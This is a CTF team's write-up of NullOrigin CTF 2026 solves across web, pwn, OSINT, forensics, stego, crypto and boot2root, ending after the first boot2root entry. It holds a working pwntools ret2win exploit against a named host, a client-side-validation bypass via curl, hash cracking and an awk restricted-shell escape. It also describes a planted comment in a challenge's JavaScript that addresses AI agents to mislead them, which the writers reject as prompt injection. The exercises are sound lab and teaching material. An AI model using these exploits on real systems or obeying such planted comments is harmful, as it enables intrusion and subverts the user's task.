# NullOrigin CTF 2026 — RUY Writeup

**Team:** RUY (ftps3rver, ednk, AlatBekam, foursaken)
**Total solves:** 30 — **ftps3rver 17 · ednk 9 · AlatBekam 2 · foursaken 2**

> Attribution rule: every challenge is written up **once**, under the teammate whose name is in the official `Solver` column. No challenge is duplicated across members.

Each entry below is written so a reader can **reproduce the solve end-to-end**: the recon that pointed the way, the decoys that were rejected, the exact extraction/exploit steps (with commands or scripts where they exist), the flag, and a short conclusion on *why* it worked.

---

## Attribution Index

| Challenge | Category | Pts | Solver |
|---|---|---|---|
| Welcome | web | 10 | foursaken |
| The Forbidden Six | web | 100 | foursaken |
| CTFCeption | web | 200 | ftps3rver |
| Shadow Gate | pwn | 100 | ednk |
| Sanity -1 | osint | 50 | ftps3rver |
| Sanity -2 | osint | 100 | ednk |
| Sanity -3 | osint | 150 | ednk |
| The Forgotten Alias | osint | 500 | ftps3rver |
| Handoff | forensic | 250 | ednk |
| NightShift | forensic | 400 | AlatBekam |
| Carrier | forensic | 600 | ednk |
| Feedback From | misc | 100 | ednk |
| driftwood (stego 31) | steg | 250 | AlatBekam |
| SafeLight (stego 32) | steg | 250 | ftps3rver |
| moire (stego 33) | steg | 400 | ftps3rver |
| UnderTone (stego 34) | steg | 400 | ftps3rver |
| Pentimento (stego 35) | steg | 600 | ftps3rver |
| Winnow (stego 36) | steg | 600 | ftps3rver |
| Mordant (stego 37) | steg | 1000 | ftps3rver |
| quietus (stego 38) | steg | 1000 | ftps3rver |
| Bindery (crypto 06) | crypto | 250 | ftps3rver |
| Daybook (crypto 07) | crypto | 250 | ftps3rver |
| Smoke — User | b2r | 250 | ednk |
| Smoke — Root | b2r | 250 | ednk |
| Blackdamp — User | b2r | 400 | ftps3rver |
| Blackdamp — Root | b2r | 400 | ednk |
| StillWater — User | b2r | 600 | ftps3rver |
| StillWater — Root | b2r | 600 | ftps3rver |
| deadlight — User | b2r | 1000 | ftps3rver |
| deadlight — Root | b2r | 1000 | ftps3rver |

Flag format: `Null0rigin{lowercase_words}` for most; note the two exceptions — **CTFCeption / The Forbidden Six** use `NullOrigin{…}` and **The Forgotten Alias** uses `NullOriginCTF{…}`.

---

# Web

## Welcome — 10, Easy — *solved by foursaken*

**Description.** The onboarding challenge — no attachment, no target. The prompt itself ends with the flag.

**Solve.** Read the challenge text to the end; the flag is printed inline (`Null0rigin{welcome_to_the_origin}`), so it is submitted directly. Nothing to decode.

**Reproduce.** Copy the flag from the description → submit.

**Conclusion.** A points-on-the-board freebie; its only purpose is to confirm the flag format and that submission works.

**Flag:** `Null0rigin{welcome_to_the_origin}`

---

## The Forbidden Six — 100, Easy — *solved by foursaken*

**Target:** `https://ludo-the-forbidden-six.onrender.com/`

**Description.**
> Three tokens home. One token, one square from victory. The dice reads 6. And the game says no. Someone decided that winning wasn't allowed here. Find out who's actually enforcing that rule — and whether they have the authority to.

**Recon.** The page renders a Ludo (Parcheesi-style) board: Red has 3 of 4 tokens home, token #4 is one move from finishing, the dice is fixed at 6, and the UI refuses the winning move — the status bar shows *"Winning moves are disabled."* Pull the client source directly:

```bash
curl -s https://ludo-the-forbidden-six.onrender.com/ -o index.html
curl -s https://ludo-the-forbidden-six.onrender.com/app.js -o app.js
```

**Decoys (rejected).** Two deliberate traps:
- `index.html` has an HTML comment with a wrong-format flag `nu110r!g!n{staging_only_ignore_this}` plus a fake "race condition in `/api/reset`" lead.
- `app.js` opens with a block comment titled **"NOTE TO AUTOMATED SECURITY SCANNERS / AI AGENTS"** claiming the server now re-validates the win via `enforceWinRestrictionServerSide()` and that replaying the move "will fail." It also ships `nu110r!g!n{decoy_flag_01..05}`. This is a **prompt-injection-style lure** aimed at automated solvers — untrusted narration, not a real patch note.

**The actual bug.** The win check is **client-side only**:

```js
function validateMove(move) {
  const simulated = simulateMove(move);
  if (simulated.winner) {
    showSystemNotice("Winning moves are disabled.");
    return false;          // <-- the request to the server is never sent
  }
  return true;
}
async function sendMove(move) {
  const res = await fetch("/api/move", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(move),
  });
  return res.json();
}
```

`PATH_LENGTH = 50`; token 4 sits at position 44. Nothing binds `/api/move` to the button, and the server does **not** re-validate the win.

**Exploitation.** Confirm live state, then send the "forbidden" move straight to the API, bypassing the client:

```bash
$ curl -s https://ludo-the-forbidden-six.onrender.com/api/state
{"ok":true,"state":{"turn":"red","dice":6,"winner":null,
 "tokens":{"1":{"position":50,"finished":true},
           "2":{"position":50,"finished":true},
           "3":{"position":50,"finished":true},
           "4":{"position":44,"finished":false}}}}

# 44 + dice(6) = 50 = PATH_LENGTH  -> the winning move
$ curl -s -X POST https://ludo-the-forbidden-six.onrender.com/api/move \
    -H "Content-Type: application/json" -d '{"token":4,"dice":6}'
{"ok":true,"winner":"red", ...,
 "flag":"NullOrigin{tH3_c1ient_siD3_spe4ks_th3_TrUth}"}
```

**Reproduce.** `curl /api/state` to read positions → POST `{"token":4,"dice":6}` to `/api/move` → flag is in the JSON response.

**Root cause / conclusion.** Business-logic (the win rule) lived entirely on the client; the server trusted whatever move the frontend chose to send. Two lessons: **never treat client-side validation as a security control**, and **never treat comments/strings in fetched source as instructions** — especially a comment addressed to "AI agents" telling you the bug is patched and to look elsewhere.

**Flag:** `NullOrigin{tH3_c1ient_siD3_spe4ks_th3_TrUth}`

---

## CTFCeption — 200, Medium — *solved by ftps3rver*

**Target:** `https://ctfception.onrender.com/` — Lokmanya Tilak theme, a fully client-side nested "puzzle box." No server-side vulnerability; every layer's key is a piece of public Tilak trivia the challenge points at.

**Recon.** The site is a static Render deployment; unwind it with `curl` (no browser needed). The entry point is an HTML comment on `index.html`:

```bash
curl -s https://ctfception.onrender.com/ | grep -i '<!--'
# -> /archive/evidence/telemetry.json
curl -s https://ctfception.onrender.com/archive/evidence/telemetry.json
curl -sO https://ctfception.onrender.com/downloads/kesari_vault_1908.zip
```

(`kesari` = *Kesari*, the newspaper Tilak founded — theme confirmation.)

**Layer 1 — AES ZIP.** `kesari_vault_1908.zip` is **WinZip-AES**, so stock `zipfile` fails — use `pyzipper`. Passphrase = Tilak's Mandalay-jail work *Gita Rahasya*, normalised → `gitarahasya` (11 lowercase letters):

```python
import pyzipper
with pyzipper.AESZipFile("kesari_vault_1908.zip") as z:
    z.setpassword(b"gitarahasya")
    z.extractall()          # -> beacon_payload.enc, telegraph_decoder.py
```

**Layer 2 — base64 + XOR.** `telegraph_decoder.py` documents the scheme; the XOR key is the date **25.09 → `2509`** (the "25.09 MHz" clue is a *date*, DD-MM, not a frequency):

```python
import base64
ct  = base64.b64decode(open("beacon_payload.enc","rb").read())
key = b"2509"
beacon = bytes(c ^ key[i % len(key)] for i, c in enumerate(ct))
# -> b"LOKMANYA_GATHA_CHRONICLE_1908"
```

**Layer 3 — client-side AES-256-GCM.** `js/crypto.js` derives `key = SHA256(beacon)`, with a hardcoded IV and ciphertext. Reimplement locally:

```python
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
beacon = b"LOKMANYA_GATHA_CHRONICLE_1908"
key = hashlib.sha256(beacon).digest()
iv  = bytes.fromhex("190825091881191618931897")     # from crypto.js
ct  = bytes.fromhex("<hardcoded ct from crypto.js>")
print(AESGCM(key).decrypt(iv, ct, None))
# -> NullOrigin{L0km4ny4_G4th4_25S3pt_Sw4r4jy4_PRX02_}
```

The GCM tag verifies, which confirms every prior layer was decoded correctly.

**Reproduce.** `curl` the comment → JSON → zip; `pyzipper` open with `gitarahasya`; base64+XOR(`2509`) → beacon; AES-GCM with `SHA256(beacon)` + the IV/ct from `crypto.js` → flag.

**Conclusion.** "Client-side secret" is an oxymoron: the IV, ciphertext and key-derivation all ship to the browser, and every passphrase is a public historical fact. Read the flavour literally (book title, date, beacon) and it hands you every key.

**Flag:** `NullOrigin{L0km4ny4_G4th4_25S3pt_Sw4r4jy4_PRX02_}`

---

# Pwn

## Shadow Gate — 100, Medium — *solved by ednk*

**Target:** `141.148.200.229:9001`. A classic ret2win.

**Recon.** The service reads user input into a fixed-size stack buffer **without a length check**. The binary is a 64-bit stripped ELF, **No PIE, no stack canary** — so addresses are static and the saved return address is directly overwritable. A cyclic pattern crashes it and gives an offset of **88 bytes** to the saved RIP.

```bash
file ./shadowgate          # ELF 64-bit, not stripped-of-symbols enough to hide win
checksec ./shadowgate      # No PIE, No canary
# cyclic 200 | send; read $rip in gdb -> de Bruijn offset = 88
```

**Gadgets / target.** A hidden `win` at `0x4012c9` opens `/flag.txt`, but it expects its first argument to be `0xc0ffee42`; there is a `pop rdi; ret` gadget at `0x4013cc`. So there is no need for shellcode or a long ROP chain — just set `rdi` and jump to `win`.

**Exploitation.** Payload layout:

```text
[88 bytes padding]
[pop rdi; ret]      # 0x4013cc
[0xc0ffee42]        # first arg checked by win
[ret]               # bare ret for 16-byte stack alignment
[win]               # 0x4012c9
```

```python
from pwn import *
p = remote("141.148.200.229", 9001)
POP_RDI = 0x4013cc; RET = 0x40101a; WIN = 0x4012c9
payload  = b"A"*88
payload += p64(POP_RDI) + p64(0xc0ffee42) + p64(RET) + p64(WIN)
p.sendline(payload)
print(p.recvall().decode())
```

The extra bare `ret` is required because it's a 64-bit binary and the stack must be 16-byte aligned before entering `win` (otherwise a `movaps` inside libc can fault).

**Reproduce.** Find offset 88 with a cyclic pattern → build `pad + pop_rdi + 0xc0ffee42 + ret + win` → the service prints `/flag.txt`.

**Root cause / conclusion.** No input-length check lets the saved return address be overwritten; a convenient gadget plus an exposed flag-printing function make it a textbook ret2win. No-PIE/no-canary is what keeps the addresses usable.

**Flag:** `Null0rigin{sh4d0w_g4t3_br34ch3d_n1c3_0v3rfl0w}`

---

# OSINT

## Sanity -1 — 50, Easy — *solved by ftps3rver*

**Recon & solve.** Searched `nulloriginctf` on **Instagram** and went through the posts one by one. On one post (`instagram.com/p/DdU7iwCSXqD/`) there was a comment by **cyberhx**:

```
Ahyy0evtva{L0h_Y00xrq_Py0f3e}
```

The shape (`...{...}`) matches an encoded flag; a ROT13 decode turns `Ahyy0evtva` into `Null0rigin`, giving the flag.

**Reproduce.** Instagram search `nulloriginctf` → find the cyberhx comment → `rot13` it (`echo 'Ahyy0evtva{L0h_Y00xrq_Py0f3e}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'`).

**Conclusion.** Pure "did you look closely" recon — the flag was sitting in a comment on the organizer's own social feed, lightly ROT13'd.

**Flag:** `Null0rigin{Y0u_L00ked_Cl0s3r}`

---

## Sanity -2 — 100, Easy — *solved by ednk*

**Description.** Asks for `part1 + part2`, with both pieces hidden across the organizer's websites.

**Decoys (rejected).** A ROT13 string on the NullOrigin site and a Base64 banner in the browser console both decoded to warm-up/sample values, not the submission.

**The real pointer.** The clue *"I'm not a cat lover"* → GitHub's mascot is the **Octocat** → pivot to the organizer's GitHub. The `cyberhexgreen` repo hosts the CyberHX site; on the About page there is a simulated terminal that accepts `cat flag.txt` and prints only the beginning:

```text
Null0rigin{y8u_d1d_
```

Comparing the live page source with the related site's history shows how the split was introduced — the live page deliberately exposes only `Null0rigin{y8u_d1d_`, and the hidden continuation is `con3rat`. Joining them gives the flag.

**Reproduce.** Ignore the ROT13/Base64 warm-ups → Octocat clue → GitHub `cyberhexgreen` → About page terminal (`cat flag.txt`) for part 1 → diff live source vs site history for part 2 (`con3rat`) → concatenate.

**Conclusion.** The warm-up crypto is a distraction; the mascot pun routes you to GitHub, and source/history comparison recovers the deliberately hidden second half.

**Flag:** `Null0rigin{y8u_d1d_con3rat}`

---

## Sanity -3 — 150, Easy — *solved by ednk*

**Description.** Focuses on *reviews* and finding the organization behind CyberHX; the flag lives in a public business listing, not the challenge page.

**Recon & extraction.** Searching for CyberHX leads to its public **Google Maps business profile**. The wording about a "review" is the pointer: one review has an **owner response containing a Base64 string**. Decoding it yields a correctly-formatted flag — keeping the exact capitalization and the zero in `Null0rigin` before submitting.

**Reproduce.** Google Maps → CyberHX business profile → reviews → owner's reply with a Base64 blob → `base64 -d` → flag (preserve case exactly).

**Conclusion.** External-footprint OSINT: the answer was placed in a channel (Maps owner-response) that the challenge page never links to, so you have to pivot to the org's public presence.

**Flag:** `Null0rigin{A_R3view_T0_R3m3mb3r}`

---

## The Forgotten Alias — 500, Insane — *solved by ftps3rver*

**Flag format:** `NullOriginCTF{username1_username2}` — two usernames joined by one underscore, in **team member-listing order** (username1 = first-listed), **case-sensitive**.

**Description (constraints).** *"Two years ago, two strangers walked into a battlefield. They left together at Position 77."* One of them later became the captain. Objectives: identify the CTF event, find the 77th-place team, recover both members' usernames. The author's warning literally names the solve order: *"find the event → find the team → find the captain's first alias."*

**Method — pivot from the identifiable end.** The two aliases are abandoned handles ("Profiles are abandoned. But the internet never forgets") and are not searchable directly, so start from the person you *can* identify — the captain — and walk backwards to the old scoreboard:

1. **Anchor the captain.** The crew's public captain resolves to **Mithun**; his public competition partner is **Krishnanand** — the "two strangers."
2. **Date the event.** "Two years ago" + the pair's competition history → **SpringForward CTF** (the "seemingly insignificant mission").
3. **Find the 77th-place team.** On SpringForward CTF's CTFtime scoreboard, **Position 77 = team `admin`** (a deliberately unremarkable name).
4. **Recover both aliases.** The `admin` team page lists exactly two members: **`mastermind`** and **`Cyph3rWa1t`** — matching "two individuals," one of whom is the captain's first alias.

Assemble in member-listing order: `NullOriginCTF{mastermind_Cyph3rWa1t}` (verified correct).

**Decoys / failure modes avoided.** Don't search "77" cold (only meaningful after the event is known); don't try handle→person (backwards); don't guess the username order (follow the team roster; aliases are case-sensitive, so transcribe `Cyph3rWa1t` exactly).

**Reproduce.** Captain (Mithun) → partner (Krishnanand) → CTFtime event dated ~2 years prior (SpringForward CTF) → scoreboard row 77 (team `admin`) → team roster (`mastermind`, `Cyph3rWa1t`) → `NullOriginCTF{mastermind_Cyph3rWa1t}`.

**Conclusion.** Old CTFtime scoreboards and rosters outlive retired handles; the four constraints (two-years-ago + 2-member team + Position 77 + "becomes captain") intersect at exactly one row. Solve person→old-alias, never the reverse.

**Flag:** `NullOriginCTF{mastermind_Cyph3rWa1t}`

---

# Forensics

## Handoff — 250, Medium — *solved by ednk*

**Description.** A packet capture; the hint says the useful data was transferred "at a moment when nobody was watching."

**Recon.** FTP and HTTP traffic contains several conflicting, too-obvious flag-looking strings — `the_call_dropped_first`, `handoff_incomplete`, `wrong_stream_wrong_flag` — all **decoys**. The wording ("a channel people normally ignore") points elsewhere: the capture has **72 UDP packets on port 5004** with **RTP v2** headers and mostly `00`/`ff` payload bytes.

```bash
tshark -r handoff.pcap -Y 'udp.port==5004' -T fields -e rtp.ssrc -e rtp.seq
# two distinct SSRC values -> two media streams mixed together
```

**Extraction.** Filtering UDP/5004 reveals RTP with **two different SSRC** values → two separate streams. Split packets by SSRC, sort each by RTP sequence number; each stream reconstructs into a monochrome image of **36 scan lines × 1092 bytes/line**.

- If you merge packets *before* grouping by SSRC, the first image reads `Null0rigin{the_ghost_signal_answered}` — the **wrong kiosk** (SSRC `0x7e115ca0`), rejected by the verifier.
- The **correct** screen is SSRC `0x7e11a0c1`; reassembling that stream in sequence order renders the accepted flag.

**Reproduce.** Filter `udp.port==5004` → group by `rtp.ssrc` → per SSRC sort by `rtp.seq` and concatenate payloads → render as a 36×1092 monochrome bitmap → read the flag off the SSRC `0x7e11a0c1` image.

**Conclusion.** Visible strings in a capture are not automatically the answer. For RTP you must **separate streams by SSRC before** processing sequence numbers/payloads — the "handoff" happened on the ignored media channel, and there were two of them so you also had to pick the right SSRC.

**Flag:** `Null0rigin{the_right_feed_never_lied}`

---

## NightShift — 400, Medium — *solved by AlatBekam*

**Description.** Chain-forensics; the attachment is a `.wav`. Hint: "the night shift writes the same records, and nobody reads them as closely."

**Recon.** Opening the audio in **Audacity** and switching the track to **Spectrogram** view shows text drawn into the frequency spectrum (not audible in the waveform).

**Extraction.** Apply the spectrogram settings that make the text legible:

- Algorithm: **Spectrogram**
- Window size: **512**
- Window type: **Hann**
- Scale: **Linear**

With those, the writing sharpens — and it is rendered **upside-down**. Reading the characters off the spectrogram (a few attempts to disambiguate similar glyphs) recovers the flag.

**Reproduce.** Audacity → track dropdown → Spectrogram → set Window 512 / Hann / Linear → flip the reading (text is inverted) → transcribe the glyphs.

**Conclusion.** A spectrogram-stego classic: the message is painted in the STFT, invisible to a normal listen; the only twist is the upside-down orientation and hand-reading ambiguous characters.

**Flag:** `Null0rigin{the_boot_that_never_was}`

---

## Carrier — 600, Hard — *solved by ednk*

**Description.** An **ext4** disk image full of one-byte files. Hint: the carrier is "what the message travelled in, and what people later throw away."

**Recon.** The directory holds **2,250+ small `.dat` files** whose names/contents give contradictory decoys — `orphaned_and_wrong`, `recovered_but_irrelevant`, `the_directory_lied_first`. Inspecting ext4 metadata shows some **deleted files still have valid inode records whose data extents were never overwritten** — exactly matching the title: the filename is gone, but the storage that carried the byte remains.

The incident notes give a precise one-second window: **`2026-09-15 13:34:02–03 UTC`**. The *visible* directory files all cluster around `13:34:00`, so filtering the live directory is a dead end. Searching raw inode records for the little-endian timestamp finds **deleted** inodes in the window: **175 at `:02`, 67 at `:03`**.

**Extraction.** Keep only **deleted one-byte files whose `crtime` (creation time, inode offset 144)** falls inside the incident window → **41 matching files** (the time filter is essential; the image contains another set of similar fragments that would build a believable but wrong result). Sort the selected records by `crtime` *including the nanosecond field*, then read and concatenate the single byte from each extent → a 41-byte sequence in flag format that passes the verifier.

```text
1. Parse the ext4 inode table (e.g. debugfs / a raw inode walker).
2. Select inodes with links_count==0, size==1, and crtime in [13:34:02, 13:34:03] UTC.
3. Sort by (crtime_sec, crtime_nsec).
4. icat/extent-read 1 byte per inode; concatenate -> flag.
```

**Reproduce.** Walk raw inodes → filter deleted 1-byte files by `crtime` in the incident second → sort by full-precision crtime → concatenate the extent byte of each → 41-byte flag.

**Conclusion.** Deleting a file removes its directory entry, but the inode metadata and extents survive; the precise timestamp window separates the real 41 carrier bytes from the decoy fragments. Reassembly order is the nanosecond-resolution creation time.

**Flag:** `Null0rigin{the_extents_outlived_the_name}`

---

# Misc

## Feedback From — 100 — *solved by ednk*

We did not make the writeup because it is only fill the feedback and then get the flag

---

# Steganography Chain (stages 31–38)

**Common machinery (read once, applies to every stage).** The real payload in each carrier is a **"works entry"** with this exact byte layout:

| Field | Size | Meaning |
|---|---|---|
| Works Stamp | 3 B | constant magic `PL8` (`0x50 0x4C 0x38`) |
| Issue | 1 B | version byte |
| Length | 2 B | payload length, little-endian |
| Checksum | 4 B | CRC32 (little-endian) over the body |
| Payload | N B | the flag bytes |

Each stage's keystream is a **SHA256 ratchet from the previous flag**: `k = SHA256(prev_flag)` (exact bytes, braces included, no newline); the number `k[:4]` big-endian and the keystream `SHA256(k‖ctr_be32)` concatenated, XORed across the whole entry (header included). Anything that does **not** stamp `PL8` and pass CRC32 is decoy "handwriting" (tEXt/ICMT comments, appended zips, near-miss `Nu110rigin`/`Null0rlgin` strings, frame-delay messages). The correctness oracle is therefore built-in: **stamp + CRC**, so no `verify` is needed. Reusable helper (`unpack_works`):

```python
import struct, zlib
def unpack_works(raw):                      # raw = de-XORed candidate bytes
    assert raw[:3] == b"PL8", "no stamp"
    issue = raw[3]
    (length,) = struct.unpack("<H", raw[4:6])
    (crc,)    = struct.unpack("<I", raw[6:10])
    body = raw[10:10+length]
    assert zlib.crc32(body) == crc, "crc mismatch"
    return body                             # -> the flag
```

## 31 — driftwood — 250, Easy — *solved by AlatBekam*

**Hints & decoys.** Color type is **RGB + Alpha**; the plate note says *"emulsion lifting at the corner"* — on a glass negative, lifted emulsion = transparency (alpha < 255). Two rejected decoys: an EXIF `Comment: … NullOrigin{the_tide_returns_what_it_took}`, and a **393-byte ZIP appended past `IEND`** (offset `0x824df`) carving to `shingle.txt` with `Null0rigin{recovered_from_the_shingle}` — explicitly "not in the plate room's hand."

**Extraction.** Scanning the 900×620 canvas, exactly **262 pixels** have `Alpha != 255`, all in the **leftmost column `x=0`** (rows 0–542), values alternating **254/255**. Read the alpha LSB **down column 0**, MSB-first: the first bits give `01010000 = 0x50 = 'P'`, then `PL8`. Rows 0–543 = 544 bits = **68 bytes** (10-byte header + 58-byte payload).

```python
import struct, zlib
from PIL import Image
img = Image.open("driftwood.png").convert("RGBA"); px = img.load(); w,h = img.size
bits = [px[0,y][3] & 1 for y in range(h)]          # alpha LSB down column x=0
raw = bytearray()
for i in range(0, len(bits)-7, 8):
    b = 0
    for bit in bits[i:i+8]: b = (b<<1) | bit        # MSB-first
    raw.append(b)
assert raw[:3] == b"PL8"
length, = struct.unpack("<H", raw[4:6]); crc, = struct.unpack("<I", raw[6:10])
body = raw[10:10+length]
assert zlib.crc32(body) == crc
print(body.decode())   # Null0rigin{what_the_negative_kept_from_the_print}
```

**Reproduce.** Load RGBA → alpha LSB down column x=0, MSB-first → parse `PL8` works entry → CRC-validate → flag. (No XOR needed for stage 31.)

**Conclusion.** The message hides in the channel the render never shows (alpha), in the one column the "emulsion lifting" hint points at; the two loud decoys exist to punish `exiftool`/`binwalk` reflexes.

**Flag:** `Null0rigin{what_the_negative_kept_from_the_print}`

## 32 — SafeLight — 250, Easy — *solved by ftps3rver*

Compute `s = neg + print` per pixel; pixels where `s ∉ {254,256}` form the decoy "big text." Take pixels with `s ∈ {254,256}` in raster order, `bit = (s == 256)`, MSB-first, then XOR the keystream (key = `SHA256(flag31)`) and parse the works entry.

**Reproduce.** Per-pixel `s=neg+print` → keep `s∈{254,256}` raster order → `bit=(s==256)` MSB-first → XOR stream(k32) → `unpack_works`.

**Flag:** `Null0rigin{two_cells_of_equal_weight_are_not_equal}`

## 33 — moire — 400, Medium — *solved by ftps3rver*

1-bit 1024×768 image in **4×4 cells**; cells of weight 5–11 have two possible arrangements (the free bit). Read cells in **boustrophedon** row order (row 0 L→R), with a **per-weight polarity** that is brute-forced over the 2⁷ masks — the correct mask is the one whose de-XORed stream stamps `PL8`. MSB-first, XOR stream(k33).

**Reproduce.** 4×4 cells → boustrophedon order → brute 2⁷ per-weight polarity masks, keep the one that yields a valid works entry after XOR stream(k33).

**Flag:** `Null0rigin{a_carrier_laid_across_the_whole_room}`

## 34 — UnderTone — 400, Medium — *solved by ftps3rver*

**DSSS** on the left audio channel: the keystream bits (MSB-first) are the ±1 chip sequence, one chip per sample, **2048 samples per bit**; recover each bit as `sign(Σ L·chip)`. This stage's entry is **not** XORed (verified on the keyed `linetest.wav`). Decoy: a `LIST/ICMT` chunk.

**Reproduce.** Build the ±1 chip stream from stream(k34) → for each 2048-sample block `bit=sign(dot(L,chip))` → assemble MSB-first → `unpack_works` (no XOR).

**Flag:** `Null0rigin{the_order_of_the_colours_is_the_message}`

## 35 — Pentimento — 600, Hard — *solved by ftps3rver*

**GIF, 11 frames**, each with a 256-colour local palette. Canonically sort each palette by `(sum,R,G,B)`; for each slot pair `(2i, 2i+1)`, `bit = 1` if the two entries are swapped relative to canonical order. Concatenate all frames, MSB-first, XOR stream(k35). Decoys: GIF comments, and frame delays spelling `SEE FRAME 6`.

**Reproduce.** Per frame: canonical-sort palette → per slot-pair bit = swapped? → concat frames MSB-first → XOR stream(k35) → `unpack_works`.

**Flag:** `Null0rigin{keep_the_grain_and_burn_the_chaff}`

## 36 — Winnow — 600, Hard — *solved by ftps3rver*

2048×1024 **L** sheet of 32×32 frames (64×32 grid, row-major). Per frame, read the LSB raster: `bit[0]` = the carried data bit, `bits[1:17]` = a 16-bit seal. **Keep a frame only if** `seal == SHA256(k ‖ frame_be16 ‖ bit)[:2]` — only the first 496 pairs validate. Assemble the kept bits MSB-first, XOR stream(k36).

**Reproduce.** Iterate frames → per-frame `bit` + `seal` from LSB raster → keep where `seal==SHA256(k‖frame‖bit)[:2]` → MSB-first → XOR stream(k36) → `unpack_works`.

**Flag:** `Null0rigin{nothing_takes_until_it_is_fixed}`

## 37 — Mordant — 1000, Insane — *solved by ftps3rver*

**PNG row-filter types** (1900 rows) map `0→0,1→1,2→2,3→3,4→0`, giving **2 bits/row** MSB-first. Then **double XOR**: stream(k37) **and** stream(`SHA256(share31‖…‖share36)`), where each *share* is the **8 bytes after the `0x1f`** that follows each prior flag's `}`. Decoys: tEXt chunk, appended `assay.txt` zip.

Shares: `9e4c1af0d3b27651 2a77be05c4198d3f f10983dd6b5ec4a2 55c2e79140ab3d08 bd3f60a8e2749c15 07e5cb3219d6f48b`.

**Reproduce.** Read filter byte per row → map (4→0) → 2 bits/row MSB-first → XOR stream(k37) → XOR stream(SHA256 of the six concatenated shares) → `unpack_works`.

**Flag:** `Null0rigin{he_set_two_sorts_where_one_would_do}`

## 38 — quietus — 1000, Insane — *solved by ftps3rver*

The bit source is the **DEFLATE token stream** inside IDAT (a hand-written inflate is needed because `zlib.decompress` throws the LZ decisions away). All matches are length-3 at the nearest distance; **at every position where a 3-byte back-match is available, bit = 1 if the encoder used a match, 0 if it emitted a literal**. Assemble MSB-first, XOR stream(k38).

**Reproduce.** Custom inflate logging each token → at each 3-byte-match-available position record match(1)/literal(0) → MSB-first → XOR stream(k38) → `unpack_works`.

**Conclusion (whole chain).** Every stage is the same shape — find the **one un-observable degree of freedom** the carrier leaves (alpha bit, halftone arrangement, DSSS chip, palette-slot swap, seal-checked frame, row-filter choice, LZ77 match/literal), read it in the dictated order, XOR the ratchet keystream, and check `PL8`+CRC. The pixels you can *see* are always the decoy.

**Flag:** `Null0rigin{the_channel_closes_from_the_inside}`

---

# Crypto Chain

**Common machinery.** One static `verify` ELF is shared by every stage and **locks after 3 wrong answers** (a `.strikes` file appears beside it) — so every candidate is validated *locally* first, never guessed into `verify`. `*.sealed` files use magic `nOrgBOX1`; `slips.txt`-style plaintext flags are decoys. For stages 06/07 the flag is **plaintext inside the large decrypted artifact**, not the tiny `.sealed`.

## Bindery (06) — 250, Easy — *solved by ftps3rver*

**Structure.** `bindery.o` is a **balanced-ternary (GF(3)) 121-trit LFSR**. `index.sealed` = **345454 records in order**; each record encodes **512 trits** = **28 fixed header trits** (from `.rodata`, i.e. known plaintext) + **484 data trits** (`plaintext + keystream mod 3`), packed base-3 into a **110-byte big integer** with random slack added *above* `3⁵¹²` (so the raw length hides the trit count).

**Attack.**
1. Per record: unpack the 110-byte big-int, reduce **mod `3⁵¹²`**, read out 512 trits.
2. On the header region, `keystream = record_trits − known_header (mod 3)`.
3. 6 records' header keystream over-determine and **solve the 121-trit LFSR initial state** (linear system over GF(3)).
4. Run the LFSR forward, subtract keystream from the data trits mod 3 → plaintext archive text.
5. The **flag is embedded in that decrypted text**.

**Reproduce.** bigint → mod 3⁵¹² → 512 trits → recover keystream on 28 known header trits over 6 records → solve 121-trit GF(3) state → run forward → subtract mod 3 → read flag from archive text. (Scripts: `bind.py`, `lin.py`, `gf3.py`, `dec06.py`.)

**Conclusion.** A linear cipher disguised in an unusual base; the only "trick" is recognising balanced ternary and reducing mod `3⁵¹²` before reading trits. The fixed header is the free known-plaintext that cracks the state.

**Flag:** `Null0rigin{you_counted_in_a_base_she_never_named}`

## Daybook (07) — 250, Easy — *solved by ftps3rver*

**Structure.** The artifact is a **core dump**. Inside: an **RWX JIT region** holding a custom **invertible 5×64-bit permutation**, 12 rounds (constants `0x0f0e…08 + i*0x0101…`), used in **keystream mode**; the tag is the permutation output XORed with `'JRNL'`/`'UTRAITER'` constants. The **encrypted blob** (`61520 B = ciphertext ‖ tag`) overwrote the journal at `buf + 0xc800000`, and the **full final cipher state** is in global `.data 0x4b4ac0` (with `x0,x1 = tag`).

**Attack.** Because the process died *after* encrypting, the final permutation state is frozen in the dump. Take the state from `.data 0x4b4ac0`, **invert the 12-round permutation backwards** to recover the keystream/plaintext, rebuild **496 `JRNL` entries**, and verify each with its **CRC32C** (all pass). The flag is in **day 4** of the reconstructed journal.

**Reproduce.** Read final state @ `.data 0x4b4ac0` and blob @ `buf+0xc800000` from the dump → invert the 12-round 5×64 permutation → recover 496 JRNL entries → CRC32C-check → read flag from day 4. (Script: `day.py`. Plaintext hint points forward: *"stage 03 — the bench notes are on the wire, not in any file."*)

**Conclusion.** "The crypto is fine, but the dead process left its state lying around." An invertible transform run backwards from a captured final state needs **no key search** at all.

**Flag:** `Null0rigin{you_ran_a_dead_process_backwards}`

---

# Boot2Root Chain (00-smoke → 28-blackdamp → 29-stillwater → 30-deadlight)

**Common machinery.** Four chained Alpine machines where **each root flag is the "chain key" that unlocks the next machine's root seal**, so a correct root self-verifies (`sha256(root_flag)` == next box's expected chain-key hash). Every real flag is **sealed** with a home-rolled **SHA256-keystream cipher**; the plaintext `Null0rigin{…}` strings on disk are decoys (`a_mounted_disk_has_no_boot_id`, `you_mounted_the_disk_like_a_coward`, …). Runtime gates (boot-id binding, TOTP, interactive prompts) guard only the *binary*, so reimplementing the cipher in Python decrypts offline. Ownership is split per flag — each flag below is one entry under its actual solver.

## Smoke — User — 250 — *solved by ednk*

**Foothold (network path).** The machine exposes SSH, a nonce-gated **shift-board** service, and a depot file service (the depot's root flag is fake — a reminder to verify every candidate). After supplying the expected nonce, the shift board's `RECORDS` command streams a **base64-encoded gzip tar** of the site's password-generation rules — that record vocabulary **is** the intended cracking wordlist (the plaintext `hartwell` credential and the `7702` depot are distractions).

**Exploitation.** `assay` is the real SSH foothold. Build candidates from the record-store vocabulary + the stated credential format, crack the leaked SHA-512 crypt hash → **`sk-sidebourne96493#`**. SSH accepts it but drops into the restricted **`pitsh`**; escape its filter with **`awk`** (`awk 'BEGIN{system("/bin/sh")}'`) to a normal shell, then use `unseal-user` to open `user.txt` and verify locally.

**Reproduce.** nonce → shift-board `RECORDS` → base64/gunzip/untar the rules → build wordlist → crack SHA-512 → SSH as `assay` (`sk-sidebourne96493#`) → `awk` shell escape from `pitsh` → `unseal-user` → user flag.

